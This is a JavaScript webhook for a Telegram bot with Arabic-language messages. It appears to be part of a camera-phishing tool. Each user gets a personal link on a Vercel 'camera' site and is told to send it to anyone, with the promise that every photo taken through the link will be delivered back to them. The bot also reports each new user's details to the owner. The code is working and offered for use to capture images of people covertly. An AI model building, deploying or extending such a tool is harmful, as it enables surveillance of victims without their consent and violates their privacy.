// api/webhook.js — VANTA for WORM
// منطق بوت @Saleckbz_cam_bot

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(200).send('OK');
    return;
  }

  const TG_TOKEN = process.env.TG_TOKEN;
  const OWNER_CHAT = process.env.TG_CHAT;

  if (!TG_TOKEN) {
    res.status(500).json({ ok: false, err: 'no token' });
    return;
  }

  let update;
  try {
    update = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
  } catch (e) {
    res.status(200).send('OK');
    return;
  }

  const msg = update && update.message;
  if (!msg) {
    res.status(200).send('OK');
    return;
  }

  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();
  const name = (msg.from && (msg.from.first_name || msg.from.username)) || 'صديق';
  const username = (msg.from && msg.from.username) ? '@' + msg.from.username : '—';

  const OWNER_TG = 'Saleck_bz';

  async function send(chat, message, replyMarkup) {
    const body = { chat_id: chat, text: message, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    await fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  }

  // ============ /start ============
  if (text === '/start' || text === '/help') {

    const link = 'https://camera-one-henna.vercel.app/t/' + chatId;

    // 1) رد للمستخدم — يظهر حسابك + رابطه الخاص
    await send(chatId,
      '👋 أهلاً ' + name + '!\n\n' +
      '👨‍💻 هذا حساب المبرمج:\n' +
      '<a href="https://t.me/' + OWNER_TG + '">@' + OWNER_TG + '</a>\n\n' +
      '🎁 وهذا <b>رابطك الخاص</b>:\n\n' +
      '<code>' + link + '</code>\n\n' +
      '📸 أرسل هذا الرابط لأي شخص.\n' +
      'كل صورة تُلتقط عبره <b>ستصلك هنا</b>.',
      {
        inline_keyboard: [
          [{ text: '💬 تواصل مع المبرمج', url: 'https://t.me/' + OWNER_TG }],
          [{ text: '📋 نسخ رابطي', url: link }]
        ]
      }
    );

    // 2) إشعار لك (المالك) بكل مستخدم جديد
    if (OWNER_CHAT && String(OWNER_CHAT) !== String(chatId)) {
      await send(OWNER_CHAT,
        '🔔 <b>مستخدم جديد</b>\n\n' +
        '👤 الاسم: ' + name + '\n' +
        '📱 اليوزر: ' + username + '\n' +
        '🆔 Chat ID: <code>' + chatId + '</code>\n\n' +
        '🔗 رابطه:\n<code>' + link + '</code>'
      );
    }

    res.status(200).send('OK');
    return;
  }

  // أي رسالة أخرى — أعد إرسال الرابط
  const link = 'https://camera-one-henna.vercel.app/t/' + chatId;
  await send(chatId,
    '👨‍💻 حساب المبرمج:\n<a href="https://t.me/' + OWNER_TG + '">@' + OWNER_TG + '</a>\n\n' +
    '🔗 رابطك الخاص:\n\n<code>' + link + '</code>',
    {
      inline_keyboard: [
        [{ text: '💬 تواصل مع المبرمج', url: 'https://t.me/' + OWNER_TG }],
        [{ text: '📋 نسخ رابطي', url: link }]
      ]
    }
  );

  res.status(200).send('OK');
}
